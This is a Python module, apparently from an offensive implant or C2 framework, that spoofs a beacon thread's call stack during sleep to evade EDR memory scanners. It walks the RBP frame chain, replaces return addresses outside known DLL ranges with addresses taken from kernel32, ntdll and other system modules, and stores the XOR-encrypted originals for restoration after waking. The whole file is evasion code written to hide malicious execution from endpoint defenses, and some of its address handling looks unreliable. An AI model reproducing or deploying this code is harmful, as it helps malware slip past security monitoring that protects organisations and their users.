"""
Call Stack Spoofing for Sleep Evasion
=======================================
Spoofs thread call stack before sleep to evade EDR memory scanners.

Problem:
- When beacon sleeps, EDR scans call stack
- Stack frames point to anonymous/unbacked memory (Python runtime, injected code)
- EDR flags "unknown return address" as anomaly

Solution:
- Before sleep: walk stack, replace malicious frames with legitimate DLL addresses
- After wake: restore original stack
- Uses RBP/EBP chain walking + Windows debug context manipulation
- Original return addresses are XOR-encrypted before storage (no plaintext in heap)

Techniques:
1. Frame Replacement: Replace Python/runtime frames with kernel32/ntdll addresses
2. Synthetic Stack: Push fake frames from legitimate modules
3. Stack Splicing: Insert return addresses to clean ntdll syscall stubs

Integration:
    from evasion.call_stack_spoofing import CallStackSpoofer
    spoofer = CallStackSpoofer()
    spoofer.enable()  # Before sleep
    time.sleep(30)
    spoofer.disable()  # After wake
"""

import ctypes
import ctypes.wintypes
import platform
import sys
import threading
import os
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

from evasion.sleep_obfuscation import SleepObfuscationEngine


class SpoofStatus(Enum):
    READY = "ready"
    ENABLED = "enabled"
    DISABLED = "disabled"
    ERROR = "error"


@dataclass
class SpoofResult:
    success: bool
    status: SpoofStatus = SpoofStatus.ERROR
    frames_spoofed: int = 0
    original_frames: List[int] = None
    error: Optional[str] = None


class CallStackSpoofer:
    """
    Spoofs thread call stack to hide malicious execution context.
    Original return addresses are XOR-encrypted before storage.
    """

    def __init__(self):
        self._system = platform.system()
        self._enabled = False
        self._original_frames: List[Tuple[int, int]] = []  # (offset, encrypted_original_addr)
        self._kernel32 = None
        self._ntdll = None
        self._legitimate_addrs: List[int] = []
        self._encryption_key: bytes = b"M0N0L1TH_STACK_SPOOF_KEY_2026"

        if self._system == "Windows":
            self._kernel32 = ctypes.windll.kernel32
            self._ntdll = ctypes.windll.ntdll
            self._collect_legitimate_addresses()

    def enable(self) -> SpoofResult:
        """Enable call stack spoofing."""
        if self._system != "Windows":
            return SpoofResult(False, SpoofStatus.ERROR, error="Windows-only")

        try:
            self._original_frames = []
            ctx = self._get_thread_context()
            if not ctx:
                return SpoofResult(False, SpoofStatus.ERROR, error="GetThreadContext failed")

            # Walk stack and replace malicious frames
            spoofed = self._spoof_stack(ctx)
            if spoofed > 0:
                self._set_thread_context(ctx)
                self._enabled = True
                return SpoofResult(True, SpoofStatus.ENABLED, frames_spoofed=spoofed)
            return SpoofResult(True, SpoofStatus.ENABLED, frames_spoofed=0)
        except Exception as exc:
            return SpoofResult(False, SpoofStatus.ERROR, error=str(exc))

    def disable(self) -> SpoofResult:
        """Disable call stack spoofing and restore original stack."""
        if not self._enabled or not self._original_frames:
            return SpoofResult(True, SpoofStatus.DISABLED)

        try:
            ctx = self._get_thread_context()
            if ctx:
                # Restore original frames (decrypt first)
                for offset, encrypted_original_addr in self._original_frames:
                    try:
                        original_addr = self._decrypt_addr(encrypted_original_addr)
                        addr_ptr = ctypes.c_void_p.from_address(offset)
                        addr_ptr.value = original_addr
                    except Exception:
                        pass
                self._set_thread_context(ctx)
            self._enabled = False
            self._original_frames.clear()
            return SpoofResult(True, SpoofStatus.DISABLED)
        except Exception as exc:
            return SpoofResult(False, SpoofStatus.ERROR, error=str(exc))

    def get_status(self) -> dict:
        return {
            "enabled": self._enabled,
            "frames_spoofed": len(self._original_frames),
            "legitimate_pool": len(self._legitimate_addrs),
        }

    # =========================================================================
    # INTERNALS
    # =========================================================================
    def _encrypt_addr(self, addr: int) -> int:
        """XOR-encrypt an address before storage."""
        key_bytes = self._encryption_key
        addr_bytes = addr.to_bytes(8, byteorder='little')
        encrypted = bytes([addr_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(8)])
        return int.from_bytes(encrypted, byteorder='little')

    def _decrypt_addr(self, encrypted_addr: int) -> int:
        """XOR-decrypt an address after retrieval."""
        return self._encrypt_addr(encrypted_addr)  # XOR is symmetric

    def _collect_legitimate_addresses(self):
        """Collect return addresses from legitimate Windows modules."""
        try:
            modules = [
                b"kernel32.dll",
                b"ntdll.dll",
                b"user32.dll",
                b"rpcrt4.dll",
                b"advapi32.dll",
                b"crypt32.dll",
            ]
            for mod_name in modules:
                h_mod = self._kernel32.GetModuleHandleA(mod_name)
                if not h_mod:
                    continue
                base = h_mod
                for offset in range(0x1000, 0x5000, 0x10):
                    addr = base + offset
                    if addr not in self._legitimate_addrs:
                        self._legitimate_addrs.append(addr)
        except Exception:
            pass

    def _get_thread_context(self) -> Optional[ctypes.Structure]:
        """Get current thread context."""
        class CONTEXT64(ctypes.Structure):
            _fields_ = [
                ("P1Home", ctypes.c_ulonglong), ("P2Home", ctypes.c_ulonglong),
                ("P3Home", ctypes.c_ulonglong), ("P4Home", ctypes.c_ulonglong),
                ("P5Home", ctypes.c_ulonglong), ("P6Home", ctypes.c_ulonglong),
                ("ContextFlags", ctypes.c_ulong), ("MxCsr", ctypes.c_ulong),
                ("SegCs", ctypes.c_ushort), ("SegDs", ctypes.c_ushort),
                ("SegEs", ctypes.c_ushort), ("SegFs", ctypes.c_ushort),
                ("SegGs", ctypes.c_ushort), ("SegSs", ctypes.c_ushort),
                ("EFlags", ctypes.c_ulong),
                ("Dr0", ctypes.c_ulonglong), ("Dr1", ctypes.c_ulonglong),
                ("Dr2", ctypes.c_ulonglong), ("Dr3", ctypes.c_ulonglong),
                ("Dr6", ctypes.c_ulonglong), ("Dr7", ctypes.c_ulonglong),
                ("Rax", ctypes.c_ulonglong), ("Rcx", ctypes.c_ulonglong),
                ("Rdx", ctypes.c_ulonglong), ("Rbx", ctypes.c_ulonglong),
                ("Rsp", ctypes.c_ulonglong), ("Rbp", ctypes.c_ulonglong),
                ("Rsi", ctypes.c_ulonglong), ("Rdi", ctypes.c_ulonglong),
                ("R8", ctypes.c_ulonglong), ("R9", ctypes.c_ulonglong),
                ("R10", ctypes.c_ulonglong), ("R11", ctypes.c_ulonglong),
                ("R12", ctypes.c_ulonglong), ("R13", ctypes.c_ulonglong),
                ("R14", ctypes.c_ulonglong), ("R15", ctypes.c_ulonglong),
                ("Rip", ctypes.c_ulonglong),
            ]

        ctx = CONTEXT64()
        ctx.ContextFlags = 0x10001F  # CONTEXT_ALL
        h_thread = self._kernel32.GetCurrentThread()
        if not h_thread or not self._kernel32.GetThreadContext(h_thread, ctypes.byref(ctx)):
            return None
        return ctx

    def _set_thread_context(self, ctx):
        """Set current thread context."""
        h_thread = self._kernel32.GetCurrentThread()
        if h_thread:
            self._kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))

    def _spoof_stack(self, ctx) -> int:
        """
        Walk stack via RBP chain and replace malicious return addresses.
        Returns number of frames spoofed.
        """
        if not self._legitimate_addrs:
            return 0

        spoofed = 0
        rbp = ctx.Rbp
        legit_iter = iter(self._legitimate_addrs)

        # Walk up to 32 frames
        for _ in range(32):
            if rbp == 0 or rbp < 0x10000:
                break

            try:
                # Read return address at [RBP+8]
                ret_addr_ptr = ctypes.c_void_p.from_address(rbp + 8)
                ret_addr = ret_addr_ptr.value

                if ret_addr and self._is_suspicious_address(ret_addr):
                    # Save original (ENCRYPTED)
                    encrypted_original = self._encrypt_addr(ret_addr)
                    self._original_frames.append((rbp + 8, encrypted_original))
                    # Replace with legitimate address
                    ret_addr_ptr.value = next(legit_iter, self._legitimate_addrs[0])
                    spoofed += 1

                # Move to next frame
                rbp = ctypes.c_void_p.from_address(rbp).value
            except Exception:
                break

        return spoofed

    def _is_suspicious_address(self, addr: int) -> bool:
        """
        Determine if a return address is suspicious.
        Suspicious = points to Python runtime, heap, or unbacked memory.
        Legitimate = points to known DLL ranges (ntdll, kernel32, etc).
        """
        if not addr:
            return False

        # Known legitimate module ranges (approximate)
        legit_ranges = [
            (0x00007FFF_80000000, 0x00007FFF_FFFFFFFF),  # ntdll
            (0x00007FFF_72000000, 0x00007FFF_73FFFFFF),  # kernel32 (typical)
            (0x00007FFF_74000000, 0x00007FFF_75FFFFFF),  # user32
            (0x00007FFF_76000000, 0x00007FFF_77FFFFFF),  # rpcrt4
            (0x00007FFF_78000000, 0x00007FFF_79FFFFFF),  # advapi32
        ]

        for low, high in legit_ranges:
            if low <= addr <= high:
                return False

        # If address is not in any known DLL range, mark as suspicious
        return True


# =============================================================================
# SLEEP INTEGRATION
# =============================================================================

class SpoofedSleepMixin:
    """
    Mixin for sleep obfuscation engines that want call stack spoofing.
    """

    def __init__(self):
        self._stack_spoofer = CallStackSpoofer()

    def spoofed_sleep(self, duration_ms: int):
        """Sleep with call stack spoofing enabled."""
        spoofer = self._stack_spoofer
        if spoofer._system == "Windows":
            spoofer.enable()
        try:
            import time
            time.sleep(duration_ms / 1000.0)
        finally:
            if spoofer._enabled:
                spoofer.disable()

